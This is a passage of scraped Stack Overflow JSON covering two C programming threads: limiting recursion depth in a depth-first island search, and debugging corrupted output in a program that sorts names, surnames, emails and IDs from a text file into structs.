"last_activity_date": 1545780773, "last_edit_date": 1545780773, "creation_date": 1545779694, "answer_id": 53926222, "question_id": 53925761, "link": "https://stackoverflow.com/questions/53925761/stop-the-recursive-function-when-it-reaches-high-depth-in-c/53926222#53926222", "title": "Stop the recursive function when it reaches high depth in c", "body": "<p>Why not have <code>!isSafe()</code> call at the beginning? You will get same results, if you have with calls to <code>isSafe()</code> inside if statements. By moving <code>isSafe ()</code> at the beginning you improve code readability by avoiding duplicate code, and you are less prone to errors. This way it will execute only return statement nothing else.</p>\n\n<p>Now comes the part you were asking for depth.</p>\n\n<pre><code>void DFS(bool M[][COL], int row, int col)  {\n    static int depth = 0;\n\n    if ( !isSafe(M, row , col) || depth &gt; 3000)\n        return;\n\n    depth++;\n\n    short k;\n\n    M[row][col] = 0; \n\n    for (k = 0; k &lt; 4; k++)\n        switch (k)\n            case 0 :\n                DFS(M, row , col - 1);\n                break;\n            case 1 :\n               DFS(M, row , col + 1);\n               break;\n            case 2 :\n                DFS(M, row + 1, col);\n                break;\n            case 3 :\n                DFS(M, row - 1, col);\n                break;\n            default :\n                return;\n}\n</code></pre>\n\n<p>Now that I think I do agree with @Tudors point about <code>for</code> loop, but I will leave this here as a way to rewrite your code using much better syntax.</p>\n"}], "owner": {"reputation": 71, "user_id": 10500431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/37sW2.jpg?s=128&g=1", "display_name": "XLVII", "link": "https://stackoverflow.com/users/10500431/xlvii"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 155, "favorite_count": 0, "answer_count": 3, "score": 2, "last_activity_date": 1545780773, "creation_date": 1545773675, "last_edit_date": 1545774102, "question_id": 53925761, "link": "https://stackoverflow.com/questions/53925761/stop-the-recursive-function-when-it-reaches-high-depth-in-c", "title": "Stop the recursive function when it reaches high depth in c", "body": "<p>I want to stop the recursive function when it reaches 3000 depth. how do I do it?</p>\n\n<pre><code> void DFS(bool M[][COL], int row, int col) \n    { \n        short k;\n\n        M[row][col] = 0; \n\n        for (k = 0; k &lt; 4; k++){\n            if(k==0){\n                if (isSafe(M, row , col - 1) ){\n                    DFS(M, row , col - 1);\n                }\n            }\n            if(k==1){\n                if (isSafe(M, row , col + 1) ){         \n\n                   DFS(M, row , col + 1);\n                }\n            }\n            if(k==2){\n                if (isSafe(M, row + 1, col) ){          \n                    DFS(M, row + 1, col);\n                }\n            }\n            if(k==3){\n                if (isSafe(M, row - 1 , col) ){         \n                    DFS(M, row - 1, col);\n                }\n            }\n        }\n\n    }\n</code></pre>\n\n<p>When I added the counter, I tried to return it when it was 3000, but I can't say I was very successful.</p>\n\n<p>I have 512 * 512 matrix and I am looking for an island in this matrix. The recursive function gives the error if one of the island's area is more than 10000 units.</p>\n"}, {"tags": ["c", "file", "malloc", "buffer-overflow", "invalid-characters"], "comments": [{"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 2, "creation_date": 1545773507, "post_id": 53925744, "comment_id": 94693003, "body": "Welcome to Stack Overflow! <a href=\"https://stackoverflow.com/questions/605845/do-i-cast-the-result-of-malloc\">don&#39;t cast malloc</a>"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1545773672, "post_id": 53925744, "comment_id": 94693026, "body": "Why are you using dynamic allocation for <code>nameTimes</code> and <code>surnameTimes</code>? These should just be ordinary local variables."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1545773937, "post_id": 53925744, "comment_id": 94693073, "body": "When you&#39;re reading the 2nd person, <code>personnumber</code> is only <code>1</code>, so you don&#39;t <code>realloc()</code> a large enough size for 1 people."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1545774250, "post_id": 53925744, "comment_id": 94693122, "body": "Since <code>writeData</code> subtracts 1 from <code>personnumber</code> except when it&#39;s <code>0</code>, you overwrite the first person with the 2nd person. That solves the problem I mentioned in my previous comment, but means you lose the first person. Try to avoid treating <code>0</code> as a special case, and simplify the code."}, {"owner": {"reputation": 1, "user_id": 10832825, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/19e3a4b95c3cdbbdc7d17e080d30fb8a?s=128&d=identicon&r=PG&f=1", "display_name": "repelliuss", "link": "https://stackoverflow.com/users/10832825/repelliuss"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1545776899, "post_id": 53925744, "comment_id": 94693526, "body": "Thanks for your comments  @Barmar.   I need to use them in another function and if i create them as pointers, i need to allocate a space for them to write something in it but now i realise that it is meaningless to use them as pointers since i can send adresses of them. Played too much with pointesr :p   For your third comment, to avoid that, <code>forOnce</code> i increase <code>personNumber</code> twice so it allocates enough for second person too."}, {"owner": {"reputation": 1, "user_id": 10832825, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/19e3a4b95c3cdbbdc7d17e080d30fb8a?s=128&d=identicon&r=PG&f=1", "display_name": "repelliuss", "link": "https://stackoverflow.com/users/10832825/repelliuss"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1545777805, "post_id": 53925744, "comment_id": 94693651, "body": "For your fourth comment, i use <code>personNumber</code> to reach another structure like <code>(person+personNumber)</code> . When it comes to <code>writeData</code> for first person, <code>personNumber</code> is 0 so it is at first structure. At second time program goes to <code>writeData</code> function, and since <code>personNumber</code> increased twice after first person, <code>(person+personNumber)</code> would point to 3. person  but i need the struct of second person so i decrease it 1 if it is not 0. I do that cause i use <code>personNumber</code> while reallocating too. @Barmar"}, {"owner": {"reputation": 465, "user_id": 7840347, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yuln6.png?s=128&g=1", "display_name": "Jim Danner", "link": "https://stackoverflow.com/users/7840347/jim-danner"}, "edited": false, "score": 1, "creation_date": 1545783311, "post_id": 53925744, "comment_id": 94694414, "body": "In the second <code>switch</code> series, in the <code>else</code> parts, shouldn\u2019t the first call be <code>strcpy</code> and only the <i>second</i> <code>strcat</code>? It says <a href=\"https://www.tutorialspoint.com/c_standard_library/c_function_strcat.htm\" rel=\"nofollow noreferrer\">here</a> that <code>strcat</code> needs a string to be there already."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1545790870, "post_id": 53925744, "comment_id": 94695244, "body": "OT: regarding <code>if (fptr == NULL) {         printf (&quot;Disorganized file couldn&#39;t open\\n&quot;);         printf (&quot;Exiting the program\\n&quot;);         exit(TRUE);</code>  Error messages should be output to <code>stderr</code>, not <code>stdout</code> and when the error indication is from a C library function, should also output the text reason the system thinks the error occurred.  To do so, call <code>perror( &quot;my error message&quot; );</code>"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1545791124, "post_id": 53925744, "comment_id": 94695280, "body": "regarding the function: <code>whichDataType()</code>  when all the <code>if()</code> statements fail, then there is a path that does not set nor return a valid value.  This causes the compiler to output a message about &quot;warning: control reaches end of non-void function.&quot;  that needs to be corrected"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1545791255, "post_id": 53925744, "comment_id": 94695300, "body": "when exiting a program, due to an error, rather than using: <code>exit( TRUE )</code>  strongly suggest using: <code>exit( EXIT_FAILURE );</code>   also, rather than defining <code>TRUE</code>, suggest adding the statement: <code>#include &lt;stdbool.h&gt;</code>  (which defines <code>true</code>, <code>false</code>, etc"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1545792214, "post_id": 53925744, "comment_id": 94695427, "body": "OT:  regarding: <code>buffer = (char*) malloc ( WORD_SIZE * sizeof(char)); (and all calls to </code>malloc()` ) 1) the expression: <code>sizeof(char)</code> is defined in the C standard as 1.  Multiplying anything by 1 has no effect. Suggest removing that expression.  2)  the returned type is <code>void*</code> which can be assigned to any pointer.  Casting just clutters the code, making it more difficult to understand, debug, etc.  3) Always check (!=NULL) the returned value to assure the operation was successful.  If not successful, then call <code>perror( &quot;malloc failed&quot; );</code>"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1545792429, "post_id": 53925744, "comment_id": 94695457, "body": "regarding: <code>while ((fscanf(fptr, &quot;%s&quot;, buffer)) == 1) {</code>  when using the input format specifier: &#39;%s&#39; and/or &#39;%[...]&#39;,  always include a MAX CHARACTERS modifier that is 1 less than the length of the input buffer because those input specifiers always append a NUL byte.  The result is the buffer will never be overflowed so never get the resulting undefined behavior"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1545792604, "post_id": 53925744, "comment_id": 94695477, "body": "when calling <code>realloc()</code>, always assign the returned value to a temp variable, then check (!=NULL) and only if not NULL then assign to the target variable.  Otherwise, when <code>realloc()</code> fails, the pointer to the original allocated heap memory will be lost, resulting in a (unrecoverable) memory leak."}, {"owner": {"reputation": 1, "user_id": 10832825, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/19e3a4b95c3cdbbdc7d17e080d30fb8a?s=128&d=identicon&r=PG&f=1", "display_name": "repelliuss", "link": "https://stackoverflow.com/users/10832825/repelliuss"}, "reply_to_user": {"reputation": 465, "user_id": 7840347, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yuln6.png?s=128&g=1", "display_name": "Jim Danner", "link": "https://stackoverflow.com/users/7840347/jim-danner"}, "edited": false, "score": 0, "creation_date": 1545930431, "post_id": 53925744, "comment_id": 94735434, "body": "Hi @JimDanner, first one is <code>strcat</code> too, cause <code>else</code> part works if there is already a name or surname, so there is no problem with using <code>strcat</code>, i suppose. If i used <code>strcpy</code> there, i would lost the first name/surname."}, {"owner": {"reputation": 1, "user_id": 10832825, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/19e3a4b95c3cdbbdc7d17e080d30fb8a?s=128&d=identicon&r=PG&f=1", "display_name": "repelliuss", "link": "https://stackoverflow.com/users/10832825/repelliuss"}, "reply_to_user": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1545933910, "post_id": 53925744, "comment_id": 94736608, "body": "Hi @user3629249 . Thanks for your all suggestions. Now i handle my<code>whichDataType()</code>, <code>exit()</code> , <code>malloc()</code> and <code>realloc()</code> functions better. I put a max character modifier too and it became <code>while ((fscanf(fptr, &quot;%29s&quot;, buffer)) == 1)</code> . After all, my problem still exists. I&#39;m still getting invalid characters after 33. person. Also isn&#39;t better for readers to let <code>sizeof(char)</code> there?"}, {"owner": {"reputation": 1, "user_id": 10832825, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/19e3a4b95c3cdbbdc7d17e080d30fb8a?s=128&d=identicon&r=PG&f=1", "display_name": "repelliuss", "link": "https://stackoverflow.com/users/10832825/repelliuss"}, "edited": false, "score": 0, "creation_date": 1545938892, "post_id": 53925744, "comment_id": 94738387, "body": "I solved the code and updated the topic. Thanks everyone."}, {"owner": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "edited": false, "score": 0, "creation_date": 1545939168, "post_id": 53925744, "comment_id": 94738504, "body": "<code>I saw the problem and solved it</code> - the proper way is to post an answer and accept it ; )"}, {"owner": {"reputation": 1, "user_id": 10832825, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/19e3a4b95c3cdbbdc7d17e080d30fb8a?s=128&d=identicon&r=PG&f=1", "display_name": "repelliuss", "link": "https://stackoverflow.com/users/10832825/repelliuss"}, "edited": false, "score": 0, "creation_date": 1545948219, "post_id": 53925744, "comment_id": 94741293, "body": "lol, sorry about that :^)"}], "answers": [{"tags": [], "owner": {"reputation": 1, "user_id": 10832825, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/19e3a4b95c3cdbbdc7d17e080d30fb8a?s=128&d=identicon&r=PG&f=1", "display_name": "repelliuss", "link": "https://stackoverflow.com/users/10832825/repelliuss"}, "is_accepted": true, "score": 0, "last_activity_date": 1545948199, "creation_date": 1545948199, "answer_id": 53951304, "question_id": 53925744, "link": "https://stackoverflow.com/questions/53925744/c-getting-invalid-characters-after-reading-a-file-and-printing-to-a-file-may/53951304#53951304", "title": "C - Getting Invalid Characters After Reading a File and Printing to a File, -maybe- Buffer Overflow", "body": "<p>I saw the problem and solved it. There was an algorithm problem. When program goes to allocate memory for name, to not allocate memory again for person's name string when it comes to the second name, to don't lose first one, i was increasing nameTimes once. Then at second switch, since it is first name, it should have enter the <code>if (*nameTimes == 0)</code> part to <code>strcpy</code>. But since i increase it already while allocating, it was never entering to that part and it was always using strcat to copy string. But there was no string to concatenate so that was causing problems. I changed the condition of that part to <code>if (*nameTimes == 1)</code>. Then second problem appeared which is it was just printing the last name only cause i wasn't increasing it again so it was stuck at <code>strcpy</code> part. So i increased it again after <code>strcpy</code> . Same goes for surname. I also improved the code thanks to @Barmar and @user3629249.</p>\n\n<p>|New Code|</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#define WORD_SIZE 30\n#define NAME 1\n#define SURNAME 2\n#define EMAIL 3\n#define ID 4\n\n\ntypedef struct ppl {\n\n    char* name;\n    char* surname;\n    char* eMail;\n    int id;\n\n} PEOPLE;\n\nint whichDataType (char* buffer);\nvoid writeData (PEOPLE* person, char* buffer, int whichData, int* nameTimes, int* surnameTimes, int personNumber);  \nvoid printData (PEOPLE* person, FILE* sptr, int personNumber);\n\nint main (void) {\n\n    FILE* fptr = NULL;\n\n    fptr = fopen(\"disorganized.txt\", \"r\");\n    if (fptr == NULL) {\n\n        perror(\"Error: \");\n        exit( EXIT_FAILURE );\n    }\n\n    FILE* sptr = NULL;\n\n    sptr = fopen(\"organized.txt\", \"w\");\n    if (sptr == NULL) {\n\n        perror(\"Error: \");\n        exit( EXIT_FAILURE );\n    }\n\n\n\n    int whichData;\n    int personNumber = 0;\n    int nameTimes = 0;\n    int surnameTimes = 0;\n    int forOnce = 0;\n    char* buffer = NULL;\n    int* buffer2 = NULL;\n    PEOPLE* person = NULL;\n    PEOPLE* realloctemp = NULL;\n\n\n\n    person = malloc (sizeof(PEOPLE));\n    if ( person == NULL ) {\n\n        perror(\"Error, malloc failed for person. \");\n        exit ( EXIT_FAILURE );\n    }\n\n    buffer = malloc ( WORD_SIZE * sizeof(char));\n    if ( buffer == NULL ) {\n\n        perror(\"Error, malloc failed for buffer. \");\n        exit ( EXIT_FAILURE );\n    }\n\n\n    while ((fscanf(fptr, \"%29s\", buffer)) == 1) {\n\n        if (personNumber != 0) {\n\n            realloctemp = realloc (person, personNumber * sizeof(PEOPLE));\n            if ( realloctemp == NULL ) {\n\n                perror(\"Error, reallocating. \");\n                exit ( EXIT_FAILURE );\n            }\n\n            else {\n\n                person = realloctemp;\n            }\n\n        }\n\n        whichData = whichDataType(buffer);\n\n        writeData(person, buffer, whichData, &amp;nameTimes, &amp;surnameTimes, personNumber);\n\n        buffer2 = malloc (sizeof(int));\n        if ( buffer2 == NULL ) {\n\n            perror(\"Error, malloc failed for buffer2. \");\n            exit ( EXIT_FAILURE );\n        }\n\n        else {\n\n            *buffer2 = fgetc(fptr);\n        }\n\n        if (*buffer2 == '\\n') {\n\n            if (forOnce == 0) {\n\n                personNumber = personNumber + 2;\n                free(buffer2);\n                free(buffer);\n\n                buffer = malloc ( WORD_SIZE * sizeof(char));\n                if ( buffer == NULL ) {\n\n                    perror(\"Error*, malloc failed for buffer. \");\n                    exit ( EXIT_FAILURE );\n                }\n\n                nameTimes = 0;\n                surnameTimes = 0;\n\n                ++forOnce;\n\n            }\n\n            else {\n\n                ++personNumber;\n                free(buffer2);\n                free(buffer);\n\n                buffer = malloc ( WORD_SIZE * sizeof(char));\n                if ( buffer == NULL ) {\n\n                    perror(\"Error**, malloc failed for buffer. \");\n                    exit ( EXIT_FAILURE );\n                }\n\n                nameTimes = 0;\n                surnameTimes = 0;\n\n            }\n\n        }\n\n        else if (*buffer2 == ' ' || *buffer2 == '\\t') {\n\n            free(buffer2);\n            free(buffer);\n            buffer = malloc ( WORD_SIZE * sizeof(char));\n            if ( buffer == NULL ) {\n\n                perror(\"Error***, malloc failed for buffer. \");\n                exit ( EXIT_FAILURE );\n            }\n\n        }\n    }\n\n    --personNumber;\n\n    printData (person, sptr, personNumber);\n\n    int i;\n\n    for (i = 0; i&lt;personNumber; ++i) {\n\n        free((person+i)-&gt;name);\n        free((person+i)-&gt;surname);\n        free((person+i)-&gt;eMail);\n\n    }\n\n    free(person);\n    free(buffer);\n    free(buffer2);\n\n    fclose(fptr);\n    fclose(sptr);\n\n    return EXIT_SUCCESS;\n}\n\nint whichDataType (char* buffer) {\n\n    if (buffer[0] &gt;= 'A' &amp;&amp; buffer[0] &lt;= 'Z') {\n\n        if (buffer[1] &gt;= 'a' &amp;&amp; buffer[1] &lt;= 'z') {\n\n            return NAME;\n        }\n\n        else if (buffer[1] &gt;= 'A' &amp;&amp; buffer[1] &lt;= 'Z') {\n\n            return SURNAME;\n        }\n    }\n\n    else if (buffer[0] &gt;= 'a' &amp;&amp; buffer[0] &lt;= 'z') {\n\n        return EMAIL;\n    }\n\n    else if (buffer[0] &gt;= '0' &amp;&amp; buffer[0] &lt;= '9') {\n\n        return ID;\n    }\n\n    else {\n\n        perror(\"Invalid data type. \");\n        exit( EXIT_FAILURE );\n\n    }\n\n} \n\nvoid writeData (PEOPLE* person, char* buffer, int whichData, int* nameTimes, int* surnameTimes, int personNumber) {\n\n    if (personNumber != 0) {\n\n        --personNumber;\n    }\n\n    switch (whichData) {\n\n        case NAME:\n\n            if (*nameTimes == 0) {\n\n                (person + personNumber)-&gt;name = malloc ( WORD_SIZE * sizeof(char));\n                if ( (person+personNumber)-&gt;name == NULL ) {\n\n                    perror(\"Error. malloc failed for (person+personNumber)-&gt;name\");\n                    exit ( EXIT_FAILURE );\n                }\n\n                ++(*nameTimes);\n            }\n\n            break;\n\n        case SURNAME:\n\n            if (*surnameTimes == 0) {\n\n                (person+personNumber)-&gt;surname = malloc ( WORD_SIZE * sizeof(char));\n                if ( (person+personNumber)-&gt;surname == NULL ) {\n\n                    perror(\"Error. malloc failed for (person+personNumber)-&gt;surname\");\n                    exit ( EXIT_FAILURE );\n                }\n\n                ++(*surnameTimes);\n            }\n\n            break;\n\n        case EMAIL:\n\n            (person + personNumber)-&gt;eMail = malloc ( WORD_SIZE * sizeof(char));\n            if ( (person+personNumber)-&gt;eMail == NULL ) {\n\n                perror(\"Error. malloc failed for (person+personNumber)-&gt;eMail\");\n                exit ( EXIT_FAILURE );\n            }\n\n            break;\n    }\n\n\n    char space[2];\n    strcpy(space, \" \");\n\n\n    switch (whichData) {\n\n        case NAME:\n\n            if (*nameTimes == 1) {\n\n                strcpy( (person+personNumber)-&gt;name, buffer);\n                ++(*nameTimes);\n            }\n\n            else if (*nameTimes&gt;1) {\n\n                strcat ( (person+personNumber)-&gt;name, space);\n                strcat( (person+personNumber)-&gt;name, buffer);\n            }\n\n            else {\n\n                perror(\"Error, invalid nameTimes value. \");\n                exit ( EXIT_FAILURE );\n            }\n\n            break;\n\n        case SURNAME:\n\n            if (*surnameTimes == 1) {\n\n                strcpy ( (person+personNumber)-&gt;surname, buffer);\n                ++(*surnameTimes);\n            }\n\n            else if (*surnameTimes&gt;1) {\n\n\n                strcat( (person + personNumber)-&gt;surname, space);\n                strcat( (person + personNumber)-&gt;surname, buffer);\n\n            }\n\n            else {\n\n                perror(\"Error, invalid surnameTimes value. \");\n                exit ( EXIT_FAILURE );\n            }\n\n            break;\n\n        case EMAIL:\n\n            strcpy( (person + personNumber)-&gt;eMail, buffer);\n\n            break;\n\n        case ID:\n\n            (person+personNumber)-&gt;id = atoi(buffer);\n\n            break;\n\n    }\n\n\n}\n\nvoid printData (PEOPLE* person, FILE* sptr, int personNumber) {\n\n    fprintf(sptr, \"-------------------------------------------------------------------------------------------------------------------------------------------------------------------\");\n    fprintf(sptr, \"\\n|%30s\\t\\t\", \"***NAME***\");\n    fprintf(sptr, \"|%30s\\t\\t\", \"***SURNAME***\");\n    fprintf(sptr, \"|%30s\\t\\t\", \"***E-MAIL***\");\n    fprintf(sptr, \"|%30s\\t|\\n\", \"***ID NUMBER***\");\n    fprintf(sptr, \"-------------------------------------------------------------------------------------------------------------------------------------------------------------------\");\n\n    int i;\n\n    for (i = 0; i&lt;personNumber; ++i) {\n\n        fprintf(sptr, \"\\n|%d%30s\\t\\t\", i+1, (person+i)-&gt;name);\n        fprintf(sptr, \"|%30s\\t\\t\", (person+i)-&gt;surname);\n        fprintf(sptr, \"|%30s\\t\\t\", (person+i)-&gt;eMail);\n        fprintf(sptr, \"|%30d\\t|\\n\", (person+i)-&gt;id);\n        fprintf(sptr, \"-------------------------------------------------------------------------------------------------------------------------------------------------------------------\");\n    }\n\n}\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 10832825, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/19e3a4b95c3cdbbdc7d17e080d30fb8a?s=128&d=identicon&r=PG&f=1", "display_name": "repelliuss", "link": "https://stackoverflow.com/users/10832825/repelliuss"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 295, "favorite_count": 0, "accepted_answer_id": 53951304, "answer_count": 1, "score": 0, "last_activity_date": 1546101854, "creation_date": 1545773406, "last_edit_date": 1546101854, "question_id": 53925744, "link": "https://stackoverflow.com/questions/53925744/c-getting-invalid-characters-after-reading-a-file-and-printing-to-a-file-may", "title": "C - Getting Invalid Characters After Reading a File and Printing to a File, -maybe- Buffer Overflow", "body": "<p>I have a file with names, surnames, ids, and e-mails which is in a random order. I have to organize these datas, write to structures and to an output file as organized. There may be more than one name and surname. Here is an example of <code>disordered.txt:</code></p>\n\n<pre class=\"lang-none prettyprint-override\"><code>abc@gmail.com Andee Kenny SMITH 1234\nADAM ADAM abc@gmail.com Andeee 21654\nAnderea abc@gmail.com SAMMY 3524654\nabc@gmail.com Andi BROWN 1245\nAndie abc@gmail.com KNOWY 2485\nAndra abc@gmail.com BRUCE 52445\nAndrea abc@gmail.com 246574 DENNIS\n2154 Andreana abc@gmail.com CHASE\nAndree 21524 SIERRRA abc@gmail.com\nAndrei 154 MONDY abc@gmail.com\n4564765 Andria LE BARC abc@gmail.com\n78 Andriana abc@gmail.com WALLS\n</code></pre>\n\n<p>My code works fine with this 12 people but if I copy-paste it a lot or add new people, after 33 people, it prints invalid characters in front of the names and surnames in repeating manner.</p>\n\n<p>Here is the screenshot of: <a href=\"https://i.stack.imgur.com/BHr1y.png\" rel=\"nofollow noreferrer\">organized.txt</a></p>\n\n<p>I preferred to use char pointers in my structure.</p>\n\n<p>Here is my code:</p>\n\n<pre class=\"lang-c prettyprint-override\"><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#define TRUE 1\n#define WORD_SIZE 30\n#define NAME 1\n#define SURNAME 2\n#define EMAIL 3\n#define ID 4\n\ntypedef struct ppl {\n    char* name;\n    char* surname;\n    char* eMail;\n    int id;\n} PEOPLE;\n\nint whichDataType (char* buffer);\nvoid writeData (PEOPLE* person, char* buffer, int whichData, int* nameTimes, int* surnameTimes, int personNumber);  \nvoid printData (PEOPLE* person, FILE* sptr, int personNumber);\n\nint main (void) {\n    FILE* fptr = NULL;\n\n    fptr = fopen(\"disorganized.txt\", \"r\");\n    if (fptr == NULL) {\n        printf (\"Disorganized file couldn't open\\n\");\n        printf (\"Exiting the program\\n\");\n        exit(TRUE);\n    }\n\n    FILE* sptr = NULL;\n\n    sptr = fopen(\"organized.txt\", \"w\");\n    if (sptr == NULL) {\n        printf (\"Organized file couldn't open\\n\");\n        printf (\"Exiting the program\\n\");\n        exit(TRUE);\n    }\n\n    int whichData;\n    int personNumber = 0;\n    int* nameTimes;\n    int* surnameTimes;\n    int forOnce = 0;\n    char* buffer;\n    int* buffer2;\n    PEOPLE* person;\n\n    person = (PEOPLE*) malloc (sizeof(PEOPLE));     \n    buffer = (char*) malloc ( WORD_SIZE * sizeof(char));\n    nameTimes = (int*) malloc ( sizeof(int));\n    surnameTimes = (int*) malloc (sizeof(int));\n\n    *nameTimes = 0;\n    *surnameTimes = 0;\n\n    //gets word 'till EOF\n    while ((fscanf(fptr, \"%s\", buffer)) == 1) {\n        if (personNumber != 0) {\n            //creates new structure\n            person = (PEOPLE*) realloc (person, personNumber * sizeof(PEOPLE));\n        }\n        //looks what type of data\n        whichData = whichDataType(buffer);\n        //allocates inside of structures and writes\n        writeData(person, buffer, whichData, nameTimes, surnameTimes, personNumber);\n\n        buffer2 = (int*) malloc (sizeof(int));\n        *buffer2 = fgetc(fptr); //checks what's coming next\n\n        if (*buffer2 == '\\n') {\n            if (forOnce == 0) {\n                //to open a place for next person in my structure pointer, since personNumber = 0; increasing it with 1 and reallocating it with 1*sizeof(PEOPLE) would be the allocating memory for person 1 twice.\n                personNumber = personNumber + 2;\n                free(buffer2);\n                free(buffer);\n                buffer = (char*) malloc ( WORD_SIZE * sizeof(char));\n                *nameTimes = 0;\n                *surnameTimes = 0;\n                ++forOnce;\n            }\n            else {\n                ++personNumber;\n                free(buffer2);\n                free(buffer);\n                buffer = (char*) malloc ( WORD_SIZE * sizeof(char));\n                *nameTimes = 0;\n                *surnameTimes = 0;\n            }\n        }\n        else if (*buffer2 == ' ' || *buffer2 == '\\t') {\n            free(buffer2);\n            free(buffer);\n            buffer = (char*) malloc ( WORD_SIZE * sizeof(char));\n        }\n    }\n\n    --personNumber; //my algorithm increases it 1 more time which is redundant\n\n    printData (person, sptr, personNumber);\n    int i;\n\n    for (i = 0; i&lt;personNumber; ++i) {\n        free((person+i)-&gt;name);\n        free((person+i)-&gt;surname);\n        free((person+i)-&gt;eMail);\n    }\n\n    free(person);\n    free(buffer);\n    free(buffer2);\n    free(nameTimes);\n    free(surnameTimes);\n\n    fclose(fptr);\n    fclose(sptr);\n\n    return 0;\n}\n\nint whichDataType (char* buffer) {\n    if (buffer[0] &gt;= 'A' &amp;&amp; buffer[0] &lt;= 'Z') {\n        if (buffer[1] &gt;= 'a' &amp;&amp; buffer[1] &lt;= 'z') {\n            return NAME;\n        }\n        else if (buffer[1] &gt;= 'A' &amp;&amp; buffer[1] &lt;= 'Z') {\n            return SURNAME;\n        }\n    }\n    else if (buffer[0] &gt;= 'a' &amp;&amp; buffer[0] &lt;= 'z') {\n        return EMAIL;\n    }\n    else if (buffer[0] &gt;= '0' &amp;&amp; buffer[0] &lt;= '9') {\n        return ID;\n    }\n} \n\nvoid writeData (PEOPLE* person, char* buffer, int whichData, int* nameTimes, int* surnameTimes, int personNumber) {\n    if (personNumber != 0) {\n        --personNumber;\n    }\n\n    switch (whichData) {\n    case NAME:\n        if (*nameTimes == 0) {\n            (person + personNumber)-&gt;name = (char*) malloc ( WORD_SIZE * sizeof(char));\n            ++(*nameTimes);\n        }\n        break;\n\n    case SURNAME:\n        if (*surnameTimes == 0) {\n            (person+personNumber)-&gt;surname = (char*) malloc ( WORD_SIZE * sizeof(char));\n            ++(*surnameTimes);\n        }\n        break;\n\n    case 